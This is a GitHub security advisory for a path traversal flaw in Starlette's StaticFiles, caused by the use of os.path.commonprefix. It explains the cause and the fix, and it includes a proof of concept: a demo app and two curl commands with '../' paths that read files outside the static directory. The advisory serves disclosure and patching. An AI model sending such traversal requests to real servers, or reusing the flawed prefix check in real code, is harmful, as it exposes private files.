# [M] Starlette has Path Traversal vulnerability in StaticFiles

## Summary
Severity: Medium
Advisory: GHSA-v5gw-mw7f-84px
CVE: CVE-2023-29159
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2023-05-17
Source: https://github.com/advisories/GHSA-v5gw-mw7f-84px
Type: github-advisory

## Affected
- PyPI: `starlette` — affected >=0.13.5 <0.27.0

## Details
### Summary
When using `StaticFiles`, if there's a file or directory that starts with the same name as the `StaticFiles` directory, that file or directory is also exposed via `StaticFiles` which is a path traversal vulnerability.

### Details
The root cause of this issue is the usage of `os.path.commonprefix()`:
https://github.com/encode/starlette/blob/4bab981d9e870f6cee1bd4cd59b87ddaf355b2dc/starlette/staticfiles.py#L172-L174

As stated in the Python documentation (https://docs.python.org/3/library/os.path.html#os.path.commonprefix) this function returns the longest prefix common to paths.

When passing a path like `/static/../static1.txt`, `os.path.commonprefix([full_path, directory])` returns `./static` which is the common part of `./static1.txt` and `./static`, It refers to `/static/../static1.txt` because it is considered in the staticfiles directory. As a result, it becomes possible to view files that should not be open to the public.

The solution is to use `os.path.commonpath` as the Python documentation explains that `os.path.commonprefix` works a character at a time, it does not treat the arguments as paths.

### PoC
In order to reproduce the issue, you need to create the following structure:

```
├── static
│   ├── index.html
├── static_disallow
│   ├── index.html
└── static1.txt
```

And run the `Starlette` app with:

```py
import uvicorn
from starlette.applications import Starlette
from starlette.routing import Mount
from starlette.staticfiles import StaticFiles


routes = [
    Mount("/static", app=StaticFiles(directory="static", html=True), name="static"),
]

app = Starlette(routes=routes)


if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
```

And running the commands:

```shell
curl --path-as-is 'localhost:8000/static/../static_disallow/'
curl --path-as-is 'localhost:8000/static/../static1.txt'
```
The `static1.txt` and the directory `static_disallow` are exposed.

### Impact
Confidentiality is breached: An attacker may obtain files that should not be open to the public.

### Credits
Security researcher **Masashi Yamane of LAC Co., Ltd** reported this vulnerability to **JPCERT/CC Vulnerability Coordination Group** and they contacted us to coordinate a patch for the security issue.

## References
- https://github.com/encode/starlette/security/advisories/GHSA-v5gw-mw7f-84px
- https://nvd.nist.gov/vuln/detail/CVE-2023-29159
- https://github.com/encode/starlette/commit/1797de464124b090f10cf570441e8292936d63e3
- https://github.com/encode/starlette
- https://github.com/encode/starlette/blob/4bab981d9e870f6cee1bd4cd59b87ddaf355b2dc/starlette/staticfiles.py#L172-L174
- https://github.com/encode/starlette/releases/tag/0.27.0
- https://github.com/pypa/advisory-database/tree/main/vulns/starlette/PYSEC-2023-83.yaml
- https://jvn.jp/en/jp/JVN95981715
